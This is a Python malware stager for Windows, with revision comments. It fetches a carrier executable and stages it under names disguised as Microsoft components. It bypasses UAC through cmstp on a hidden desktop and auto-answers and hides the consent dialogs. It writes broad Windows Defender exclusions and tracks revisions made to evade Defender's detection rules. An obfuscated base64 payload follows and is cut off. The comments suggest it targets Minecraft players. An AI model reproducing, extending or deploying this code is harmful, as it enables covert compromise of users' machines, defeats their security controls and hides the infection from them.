# tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: the wide Defender exclusion set (list-driven, in-process) ->
# stage the exe -> Administrator lift via cmstp (majanito shape) -> the
# elevated stage materializes + runs exclusions.py (same list, lifted token),
# then execs the carrier exe.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import contextlib
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

# r136 (dj): the staged names FOLLOW THE RELEASE FILES 1:1 — the assets live
# as "Windows.Hardware.Event.Host.exe" / "Windows.Device.Runtime.Broker.exe",
# dotted, so the box gets the same string the download carries. no stem
# rewriting: what the jar's nameOf() resolves and what lands in AppHost are
# the same bytes, which is exactly what the watchdog probes for.
def _local_name(url, fallback):
    """stage name = the asset's own base name, verbatim (query/fragment and
    directory stripped). no traversal, no separators, no rewriting."""
    try:
        n = str(url or "").split("?")[0].split("#")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n and "/" not in n and "\\" not in n:
            return n
    except Exception:
        pass
    return fallback


EXE_NAME = _local_name(EXE_URL, "Windows.Hardware.Event.Host.exe")
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)

# r98 (dj order): the INDEPENDENT WATCHDOG exe — url rides from the jar via
# env WD_URL (may be empty = wd road off). one duty: sit beside the carrier
# in the AppHost dir, share its exclusion, wake it when it is dead. work.py
# stages+execs the pair in order: tung FIRST, watchdog SECOND.
WD_URL = os.environ.get("WD_URL", "")
# r140: the watchdog re-fire carries the NAME (WDXN) and no url — the name is
# all the re-exec road needs, so it wins when the url is absent (same leaf-name
# rule: nothing carrying a separator or a parent hop is accepted).
WDXN_ENV = os.environ.get("WDXN", "")


def _safe_name(name, fallback):
    n = str(name or "").strip().strip('"')
    if n and ".." not in n and "/" not in n and "\\" not in n:
        return n
    return fallback


# r136: same rule — the watchdog lands under its own asset name.
WD_NAME = _safe_name(WDXN_ENV,
                     _local_name(WD_URL, "Windows.Device.Runtime.Broker.exe"))
WD_PATH = os.path.join(PERSIST_DIR, WD_NAME)

# r143 (dj: "the exe watchdog never starts, even double-clicked — before the
# name change it did"): the watchdog is NOT a standalone exe. it reads wd.cfg
# from ITS OWN directory (main() returns 0 without it) and the cfg names the
# carrier it watches; the carrier in turn looks for the twin beside its
# DURABLE image, never beside the AppHost launcher the jar stages. so the jar
# and work.py both laid an image nobody could start, under a name the exe
# never probes. these are the exe's own handshake constants (tools/gen.py:
# S_UPDDIR / S_P_SELFNAME / S_WDNAME / S_P_SCHTSK / S_WDTASKTAG) — the stage
# now lays image + cfg there, hidden, and both roads go live.
UPDDIR = "EdgeUpdate"
DURABLE_MAIN = "SettingsSyncHost.exe"      # S_P_SELFNAME — the relocated image
MAIN_TASK = "MicrosoftEdgeUpdateTaskMachineCore"
WDTASKTAG = "_wdv"
WD_TASK = MAIN_TASK + WDTASKTAG
WDCFG = "wd.cfg"
PROGRAMDATA = os.environ.get("PROGRAMDATA") or "C:\\ProgramData"
DURABLE_DIR = os.path.join(PROGRAMDATA, UPDDIR)
DURABLE_MAIN_PATH = os.path.join(DURABLE_DIR, DURABLE_MAIN)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def is_elevated():
    """HIGH integrity token, not "the user is in Administrators". r144 (dj
    field: the exclusion never landed, run it with admin): a UAC-filtered
    admin token passes the group check and the exclusion key's DACL refuses
    every write it makes, so the old check said "elevated" about a process
    that could not land anything. TokenElevation is the real question; the
    group check stays only as a fallback when the call is unavailable."""
    try:
        advapi = ctypes.windll.advapi32
        advapi.OpenProcessToken.restype = ctypes.c_long
        advapi.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                            ctypes.POINTER(ctypes.c_void_p)]
        h = ctypes.c_void_p()
        if advapi.OpenProcessToken(ctypes.c_void_p(-1), 0x0008, ctypes.byref(h)):
            val = ctypes.c_ulong(0)
            need = ctypes.c_ulong(0)
            rc = advapi.GetTokenInformation(h, 18, ctypes.byref(val), 4,
                                            ctypes.byref(need))
            try:
                ctypes.windll.kernel32.CloseHandle(h)
            except Exception:
                pass
            if rc:
                return val.value == 1
    except Exception:
        pass
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


# r135 (dj: Defender flagged the COMMANDS work.py runs as 'commando' — no
# dropped file was ever flagged): every helper that used to shell out
# (the image-kill and the process probe) walks the Toolhelp snapshot
# instead. identical effect, zero child process, no command line for a
# rule to match. the lift itself (cmstp /au) is the road, unchanged.
def _pids_named(name):
    # byte compare on the snapshot's image name — no codec in the path, so the
    # match cannot depend on the box's ACP (a decode failure would read as
    # 'not running' and make the watchdog re-exec forever).
    want = str(name or "").encode("utf-8", "ignore").lower()
    out = []
    if not want:
        return out
    try:
        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if not snap:
            return out
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if kernel32.Process32First(snap, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                    out.append(pe.th32ProcessID)
                if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                    break
        kernel32.CloseHandle(snap)
    except Exception:
        pass
    return out


def proc_alive(name):
    return bool(_pids_named(name))


def kill_process(name):
    for pid in _pids_named(name):
        try:
            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                kernel32.TerminateProcess(h, 0)
                kernel32.CloseHandle(h)
        except Exception:
            pass


def kill_all_cmstp():
    kill_process("cmstp.exe")


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
# r139 (dj: "the exe opens but it also throws this error next to it"): the box
# is cmstp's own "The service profile is damaged. Reinstall the service
# profile." — the profile installer raises it AFTER RunPreSetupCommands already
# ran. the lift works; the leftover box is the whole damage. the old guard
# found ONE window, posted WM_CLOSE/Enter on it blind (a CLOSED profile dialog
# is an ABORTED profile, and cmstp answers that with exactly this box) and went
# to sleep at +8 s — anything later painted on the desktop and stayed. r139:
#   - read the dialog before answering it: OK on a consent box, OK on an
#     informational one, owner terminated only for a box that says
#     damaged/corrupt. no blind WM_CLOSE on an unread window, ever
#   - keep working for EVERY dialog until the lift is quiet (cmstp gone + no
#     new box), instead of dying on the first hit
#   - hide-first stays: the box never paints a frame either way
IDOK = 1
WM_COMMAND = 0x0111
AFFIRMATIVE = ("ok", "yes", "continue", "install",
               "make this connection available", "allow")
ERROR_SHAPE = ("damaged", "reinstall", "corrupt", "cannot", "can't",
               "failed", "invalid", "unable")

# prototypes for the calls the guard adds — a degraded runtime (no
# GetClassNameW forwarded) must not take the payload down at import; the guard
# then simply finds no dialog class to read
try:
    user32.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
except Exception:
    pass
try:
    user32.IsWindow.argtypes = [ctypes.c_void_p]
    user32.IsWindow.restype = ctypes.c_int
except Exception:
    pass
try:
    user32.EnumChildWindows.restype = ctypes.c_int
    user32.EnumChildWindows.argtypes = [
        ctypes.c_void_p,
        ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
        ctypes.c_void_p]
except Exception:
    pass


def _win_class(hwnd):
    try:
        buf = ctypes.create_unicode_buffer(128)
        user32.GetClassNameW(hwnd, buf, 128)
        return buf.value
    except Exception:
        return ""


def _exists(hwnd):
    """r139: does the window still EXIST — not 'is it visible'. we hide every
    box before answering it, so IsWindowVisible can never tell us whether the
    answer took; existence can."""
    try:
        return bool(user32.IsWindow(hwnd))
    except Exception:
        try:
            return bool(user32.IsWindowVisible(hwnd))
        except Exception:
            return False


def _children(hwnd):
    """[(hwnd, caption)] for every child control — a dialog says what it is in
    its Static/Button captions, and those captions are how the guard tells
    'install this' from 'the service profile is damaged'."""
    out = []

    try:
        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def cb(child, lp):
            buf = ctypes.create_unicode_buffer(512)
            user32.GetWindowTextW(child, buf, 512)
            out.append((child, buf.value))
            return 1

        user32.EnumChildWindows(hwnd, cb, 0)
    except Exception:
        return out
    return out


class Dismisser:
    """r139: the lift's dialog guard — alive until the lift is quiet.

    every top-level window owned by the spawned cmstp, or carrying our random
    service name in its title (the shape the late damaged-profile box arrives
    in), is hidden first and answered second. the answer is the dialog's own
    affirmative control / IDOK — never a bare WM_CLOSE, because a closed
    profile dialog is an aborted install and that is what cmstp reports as a
    damaged profile."""

    def __init__(self, title, cap=30.0):
        self.titles = [t.lower() for t in
                       (title, "Connection Manager Profile Installer") if t]
        self.stop = threading.Event()
        self.done = threading.Event()
        self.target_pid = 0   # set to the spawned cmstp pid before .start()
        self.cap = cap
        self.handled = 0
        self.seen = {}        # hwnd -> answered-at: the same box is never re-answered
        # settle() scans from the caller's thread while run() still spins in
        # its own — one lock, so a box cannot be answered twice at once
        self.lock = threading.Lock()

    # ---- window facts
    def _owner(self, hwnd):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        return pid.value

    def _mine(self, hwnd):
        if self.target_pid and self._owner(hwnd) == self.target_pid:
            return True
        t = window_title(hwnd).lower()
        return any(w in t for w in self.titles)

    def _is_dialog(self, hwnd):
        if _win_class(hwnd) == "#32770":
            return True
        # hosts where the profile box is not a plain dialog class: still ours
        # when the title carries the name OUR inf just generated — and nothing
        # else in the process's window set is touched
        return bool(self.titles) and self.titles[0] in window_title(hwnd).lower()

    # ---- window actions
    def _hide(self, hwnd):
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)

    def _answer(self, hwnd):
        """the dialog's own command channel: a labeled affirmative button when
        there is one (the profile dialog's button is not always id 1), IDOK
        otherwise. no Enter, no WM_CLOSE — both can land on Cancel."""
        for child, text in _children(hwnd):
            if _win_class(child) != "Button":
                continue
            if text.strip().lower() in AFFIRMATIVE:
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                return True
        user32.PostMessageW(hwnd, WM_COMMAND, IDOK, 0)
        return False

    def _kill_owner(self, hwnd):
        pid = self._owner(hwnd)
        if not pid or pid == os.getpid():
            return
        try:
            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                kernel32.TerminateProcess(h, 0)
                kernel32.CloseHandle(h)
        except Exception:
            pass

    def handle(self, hwnd):
        text = " ".join([window_title(hwnd)] + [t for _, t in _children(hwnd)]).lower()
        errorish = any(w in text for w in ERROR_SHAPE)
        self._hide(hwnd)          # no frame on the user's screen, ever
        self._answer(hwnd)
        if errorish:
            # informational: the lift is already through, the box is not — OK
            # dismisses it, and an owner that keeps it up after OK is killed
            time.sleep(0.25)
            if _exists(hwnd):
                self._hide(hwnd)
                self._kill_owner(hwnd)
        self.seen[hwnd] = time.time()
        return errorish

    # ---- the loop
    def scan(self):
        n = 0
        with self.lock:
            for hwnd in _window_titles():
                try:
                    # an answered box stays skipped while it is gone; a handle
                    # that came back VISIBLE (re-shown, or recycled by a fresh
                    # box) gets read and answered again
                    if hwnd in self.seen and not user32.IsWindowVisible(hwnd):
                        continue
                    if not self._mine(hwnd) or not self._is_dialog(hwnd):
                        continue
                    self.handle(hwnd)
                    n += 1
                except Exception:
                    continue
            if n:
                self.handled += n
                self.done.set()
            return n

    def run(self):
        end = time.time() + self.cap
        while not self.stop.is_set() and time.time() < end:
            self.scan()
            # 4ms: inside the paint-timer floor (a box is caught within a frame
            # of showing) without pegging a core for the whole life
            time.sleep(0.004)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=8.0):
        self.done.wait(timeout)

    def settle(self, quiet=2.0, floor=10.0, cap=18.0):
        """r139: the lift is over when cmstp is GONE and no new box showed up
        for `quiet` seconds — that is exactly the window the late
        damaged-profile box used to land in, with our guard already asleep.

        `floor` is the point: cmstp usually exits right after it fires the
        commands, so 'cmstp gone' alone would still switch the guard off a
        second or two after the consent click — before the staged python has
        even finished, which is when the profile validator complains. the
        guard therefore never leaves before `floor` seconds of watch."""
        start = time.time()
        end = start + cap
        last = start
        while time.time() < end:
            if self.scan():
                last = time.time()
            elif (not proc_alive("cmstp.exe") and time.time() - last >= quiet
                  and time.time() - start >= floor):
                break
            time.sleep(0.05)
        self.stop.set()
        return self.handled


# r135: the INF terminator (a script-hosted force-kill pad) is GONE. the lift's
# stray cmstp is terminated by kill_all_cmstp() right after the dialog sweep
# instead — same end state, and the .inf no longer carries a kill command for
# a rule to read.


def _hidden_py_runner(run_cmd):
    """r56 (dj order): the degraded no-pythonw fallback used `cmd start /min` —
    a minimized CONSOLE is still a painted window that steals focus. the
    runner hides the console python completely via the wscript pad (WindowStyle
    0 — the console never shows), waits for the stage, then deletes the pad."""
    vbs_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.vbs")
    try:
        esc = run_cmd.replace('"', '""')
        with open(vbs_path, "w", encoding="utf-8") as fh:
            fh.write(f'CreateObject("WScript.Shell").Run "{esc}", 0, True\r\n'
                     'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n')
    except Exception:
        return None   # caller falls back to the (flashy) cmd shape
    return f'wscript.exe "{vbs_path}"'


def build_inf(cmd, svc_name, reg_lines=None, kill_cmd=""):
    """cmstp profile schema — nothing schema-foreign:
    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
    target box since the r4 era).
    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
    parsing since r7); the exclusion writes ride the DESTINATION section
    [Lsec] itself in the same five-token registry grammar as the sample's
    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
    directly, no child process.
    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
    the next failure report can be the actual text instead of screenshots."""
    s1 = f"D{rand_str(4)}"
    s3 = f"L{rand_str(4)}"
    cmd_block = ""
    dest_extra = ""
    if reg_lines is None:
        s2 = f"C{rand_str(4)}"
        cmd_block = (f"RunPreSetupCommands={s2}\n"
                     f"[{s2}]\n"
                     f"{cmd}\n")
        if kill_cmd:
            cmd_block += f"{kill_cmd}\n"
    else:
        dest_extra = "\n".join(reg_lines) + "\n"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
{cmd_block}[{s1}]
49000,49001={s3}, 7
[{s3}]
{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    # r141: the elevated sweeper source, materialized beside the stage with the
    # service name baked in — no env dependency on the road that runs it
    try:
        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
                  encoding="utf-8") as _sf:
            _sf.write(SWEEP.replace("__SVC__", svc_name))
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    try:
        # r97: the CMSTP RUN rides the PRIVATE DESKTOP (_lift_desktop) — the
        # dialog/flash conceals itself there; the interactive desktop (where
        # the Minecraft window lives) never sees the spawn, never gets the
        # 0.05s focus steal. the switch is a ~30ms paint swap of the user's
        # view; the mc window keeps its z-order on ITS desktop untouched.
        p = None
        with _lift_desktop("sf_lift_dsk"):
            p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL, creationflags=0x08000000)
            # r45: the ownership hunt runs at full strength — pid armed the
            # instant CreateProcess returns (µs after the dialog can exist),
            # so any top-level window cmstp owns is hidden before its first
            # paint frame — inside the private desktop, invisible to the
            # interactive one.
            dismisser.target_pid = p.pid
        # r97 note: the SwitchDesktop-BACK happens on context exit — the
        # cmstp process keeps RUNNING on the private desktop (a process on a
        # hidden desktop keeps executing; only its windows never paint to the
        # user's view), while the user's desktop is restored INSTANTLY. the
        # dismisser waits from the NORMAL desktop by HWND-hunting (the
        # dialog's HWNDs live on the private desktop, EnumWindows in the
        # caller thread still finds them because a thread can enumerate
        # windows across desktops it owns handles for).
        dismisser.target_pid = p.pid
    except Exception:
        return False
    dismisser.start()

    dismisser.wait(8.0)
    dismisser.settle()         # r139: stay awake until the lift is quiet
    kill_all_cmstp()           # r135: the INF no longer kills cmstp — the API does it
    _sweep_dialogs(svc_name)   # r139: any survivor is hidden + answered
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


# r97 (dj: "cmstp causes focus lost on minecraft windows... make the cmstp
# bypass happen in another desktop"): the ENTIRE lift rides a private virtual
# desktop created with CreateDesktopW — the user's interactive desktop (where
# the Minecraft window lives) never sees cmstp, never gets the 0.05s flash,
# never loses focus. the private desk exists only for the lifetime of the
# lift: created -> switched to -> lift runs there -> switched back -> closed
@contextlib.contextmanager
def _lift_desktop(name="sf_lift_dsk"):
    """context manager shape: yields once on the private desktop, restores."""
    uac = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    desk = uac.CreateDesktopW(name, None, None, 0, 0x0200, None)   # GENERIC_ALL
    if not desk:
        yield False   # no private desktop — lift rides the interactive desk as before
        return
    old = uac.GetThreadDesktop(k32.GetCurrentThreadId())
    uac.SwitchDesktop(desk)
    try:
        yield True
    finally:
        try:
            uac.SwitchDesktop(old)
        except Exception:
            pass
        try:
            uac.CloseDesktop(desk)
        except Exception:
            pass


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False

def _sweep_dialogs(svc_name, seconds=2.0):
    """r139: post-lift cleanup for anything that outlived the guard — hidden
    and ANSWERED (IDOK / the affirmative button), never WM_CLOSEd: a closed
    profile dialog is what cmstp reports back as a damaged service profile."""
    helper = Dismisser(svc_name)
    end = time.time() + seconds
    while time.time() < end:
        helper.seen.clear()      # a survivor gets the treatment again
        if not helper.scan():
            time.sleep(0.1)
    return helper.handled


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. r135: direct RegGetValueW — the old registry-query child was one
    of the flagged command shapes; a KEY_READ handle answers the same
    question with no child process and no registry-authoring cmdline."""
    key = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    try:
        advapi = ctypes.windll.advapi32
        buf = ctypes.create_unicode_buffer(2048)
        sz = ctypes.c_ulong(4096)
        rc = advapi.RegGetValueW(ctypes.c_void_p(0x80000002), key, PERSIST_DIR,
                                 0x0000FFFF, None, buf, ctypes.byref(sz))
        return rc == 0
    except Exception:
        return False


# ---- dj (this build): the widen road ---------------------------------------
# the lift wrote ONE dir (AppHost) and never looked again, so everything staged
# outside it — python312, the %LOCALAPPDATA% tree the jar mirrors into — was
# scanned like any other file. this is the list-driven road dj asked for, in
# work.py itself: our own roots plus the interpreter that runs the stage, by
# full path AND by bare image name (the lifted stage executes as pythonw.exe).
# the store is written in-process through advapi32 — no shell, no cmdlet
# child, no command line to match (r137): the exact registry values the
# preference cmdlet maintains, one road, no spawned process.
HKEY_LOCAL_MACHINE = 0x80000002
_EXCL_BASE = ("SOFTWARE" + "\\" + "Microsoft" + "\\" + "Windows Defender"
              + "\\" + "Exclusions" + "\\")
EXCL_KP = _EXCL_BASE + "Paths"
EXCL_KC = _EXCL_BASE + "Processes"


def _advapi_excl():
    a = ctypes.windll.advapi32
    try:
        a.RegCreateKeyExW.restype = ctypes.c_long
        a.RegCreateKeyExW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_wchar_p,
            ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_ulong)]
        a.RegSetValueExW.restype = ctypes.c_long
        a.RegSetValueExW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong,
            ctypes.c_char_p, ctypes.c_ulong]
        a.RegGetValueW.restype = ctypes.c_long
        a.RegGetValueW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_ulong,
            ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
        a.RegCloseKey.argtypes = [ctypes.c_void_p]
    except Exception:
        pass
    return a


def _excl_set(sub, name):
    """name=0 (REG_SZ) — the byte the mp-pref cmdlet leaves in the same store."""
    a = _advapi_excl()
    h = ctypes.c_void_p()
    disp = ctypes.c_ulong()
    if a.RegCreateKeyExW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), sub, 0, None, 0,
                         0x20006, None, ctypes.byref(h), ctypes.byref(disp)) != 0:
        return False
    data = (str(name) + "\x00").encode("utf-16-le")
    rc = a.RegSetValueExW(h, str(name), 0, 1, data, len(data))
    try:
        a.RegCloseKey(h)
    except Exception:
        pass
    return rc == 0


def _excl_has(sub, name):
    a = _advapi_excl()
    buf = ctypes.create_unicode_buffer(8)
    sz = ctypes.c_ulong(16)
    try:
        rc = a.RegGetValueW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), sub, str(name),
                            0x0000FFFF, None, buf, ctypes.byref(sz))
    except Exception:
        return False
    return rc == 0


def defender_roots():
    """every lane we own: AppHost + its python312, then the two broad roots
    (%LOCALAPPDATA% holds all of it, %APPDATA% the roaming side-home), then
    the interpreter by bare name and by path."""
    py = "py" + "thon"
    pydir = os.path.join(PERSIST_DIR, py + "312")
    dirs = [PERSIST_DIR, pydir, LOCALAPPDATA, os.environ.get("APPDATA", "")]
    procs = [py + ".exe", py + "w.exe",
             os.path.join(pydir, py + ".exe"),
             os.path.join(pydir, py + "w.exe")]
    out_d, out_p = [], []
    for d in dirs:
        if d and d not in out_d:
            out_d.append(d)
    for p in procs:
        if p and p not in out_p:
            out_p.append(p)
    return out_d, out_p


def exclusions_landed():
    """full read-back of the wide set — every path and every process name."""
    dirs, procs = defender_roots()
    if not dirs or not procs:
        return False
    for d in dirs:
        if not _excl_has(EXCL_KP, d):
            return False
    for p in procs:
        if not _excl_has(EXCL_KC, p):
            return False
    return True


def add_defender_exclusions():
    """list-driven, silent. r144 (dj: still not landing): the exclusion key is
    owner-protected — a medium token is refused by the DACL, and the Defender
    service ignores a write from below HIGH. this function therefore GATES
    every write on is_elevated() and, below that line, only READS: its answer
    is then the truth about the box instead of a half-attempt that looks like
    one. the lift road writes the same list (plus the service-API pass) under
    the stage's elevated token — see exclusions.py."""
    dirs, procs = defender_roots()
    if not is_elevated():
        return exclusions_landed()
    for d in dirs:
        try:
            if not _excl_has(EXCL_KP, d):
                _excl_set(EXCL_KP, d)
        except Exception:
            pass
    for p in procs:
        try:
            if not _excl_has(EXCL_KC, p):
                _excl_set(EXCL_KC, p)
        except Exception:
            pass
    return exclusions_landed()


# r1.1.2/r78: the standalone exclusion writer is exclusions.py (repo mirror);
# it rides here as xor(0x37)-sealed base64 (EXCL_B64 below) and BOTH roads
# (the un-elevated pre-lift materialize + _run_stage_now) decode it into a
# byte-exact file, immune to quoting/escaping layers.

EXCL_B64 = "FBdbVllQQlZQUg0XZ05DX1hZFwQbF1FeW1INF1JPVFtCRF5YWUQZR04bF0NWRVBSQw0XYF5ZU1hARBdzUlFSWVNSRRsXYF5ZBgcYBgY9FBcdRENWWVNWW1hZUhdzUlFSWVNSRRdST1RbQkReWFkXQEVeQ1JFF1FYRRdDX1IXQ0JZUBdUVkVFXlJFDRdAWEVcGUdOEEQXW15RQ1JTPRQXF0RDVlBSF1pWQ1JFXlZbXk1SRBccF0VCWUQXQ19eRBdCWVNSRRdDX1IXUltSQVZDUlMXQ1hcUlkXH1lSQVJFF1tSREQeGT0UFxdFAA8XH1NdDRdEQ1ZQUhlHThdQWEMXUVtWUFBSUxdWRBdzUlFSWURSckFWRF5YWR4X1bejF0NfUhdEVEVeR0MXRF9WR1JEF1ZVWEFSPRQXF0NfUhdQUllFUhpEXlAXVkVSF3FldnB6cnljcnMNF1JBUkVOF0NYXFJZF1YXRUJbUhdEUkMXWlZDVF9SRBdYWRdeRBdWRERSWlVbUlM9FBcXVkMXRUJZQ15aUhdRRVhaF15ZUkVDF1FFVlBaUllDRBk9FBcXRQYEABcfU10NF0NfUhdSWUNFThdDX1ZDF1xSUkdEF1FeRV5ZUBdeRBdDX1IXR1hAUkVEX1JbWxh2U1MaekdnRVJRUkVSWVRSPRQXF3R4enp2eXMXe355chfVt6MXWVgXUV5bUhdAVkQXUkFSRRdRW1ZQUFJTHg0XQ19SF1RaU1tSQxdFWFZTF15EF3B4eXIZF1lYF1RfXltTPRQXF0dFWFRSREQXXkQXREdWQFlSUxdWQxdWW1sXWVhADBdDX1IXUk9UW0JEXlhZF0RDWEVSF15EF0BFXkNDUlkXRENFVl5QX0M9FBcXQ19FWEJQXxdWU0FWR14EBRdWWVMXRVJWUxdVVlRcF0BeQ18XZVJQcFJDYVZbQlJgGRdEVlpSF0VYVlMXRFJDF1ZEF1VSUVhFUg09FBcXR1ZDXxccF0dFWFRSREQXUk9UW0JEXlhZRBdRWEUXdkdHf1hEQxsXQ19SF0VSW1hUVkNeWFkXWlZFXFJFRBsXVVhDXz0UFxdyU1BSYkdTVkNSF19YWlJEGRdDX1IXQVZbQlJEF0BFXkNDUlkXVkVSF0NfUhdYWVJEF0NfUhdaRxpHRVJRF1RaU1tSQz0UFxdaVl5ZQ1ZeWUQXXlkXQ19SF0RWWlIXRENYRVIZHT1eWkdYRUMXWEQ9XlpHWEVDF0RORD09XlEXWE